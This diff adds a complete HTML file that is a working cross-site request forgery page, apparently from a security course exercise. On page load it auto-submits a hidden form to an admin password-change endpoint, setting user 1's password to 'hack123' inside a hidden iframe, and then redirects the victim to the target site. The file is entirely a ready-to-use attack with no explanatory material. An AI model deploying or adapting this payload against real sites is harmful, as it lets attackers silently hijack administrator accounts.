@@ -1,0 +1,47 @@
+﻿<!DOCTYPE html>
+<html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<head>
+	<title></title>
+</head>
+<body onload="MyFunc();">
+<!-- <body> -->
+  
+  <iframe style="display: none" name="csrf-frame" ></iframe>
+	
+<div style="display: none">
+  <form method="post" action="http://kalashnik0v.csec.chatzi.org/modules/admin/password.php?submit=yes&changePass=do&userid=1" target="csrf-frame" >
+  <table class="FormData" width="99%" align="left">
+  <tbody>
+  <tr>
+    <th width="220">&nbsp;</th>
+    <td><b>Ορισμός νέου συνθηματικού</b></td>
+  </tr>
+  <tr>
+    <th class="left">Νέο συνθηματικό</th>
+    <td><input type="password" size="40" name="password_form" value="hack123" ></td>
+  </tr>
+  <tr>
+    <th class="left">Νέο συνθηματικό (ξανά)</th>
+    <td><input type="password" size="40" name="password_form1" value="hack123"></td>
+  </tr>
+  <tr>
+    <th class="left">&nbsp;</th>
+    <td><input type="submit" name="submit" value="Αλλαγή"></td>
+  </tr>
+  </tbody>
+  </table>
+  </form>
+</div>
+
+	<script type="text/javascript">
+		function MyFunc() {
+      var $form = document.forms[0];
+      $form.elements[2].click();
+      setTimeout(function(){ window.location="http://kalashnik0v.csec.chatzi.org"; }, 1000);
+    }
+
+	</script>
+
+</body>
+</html>
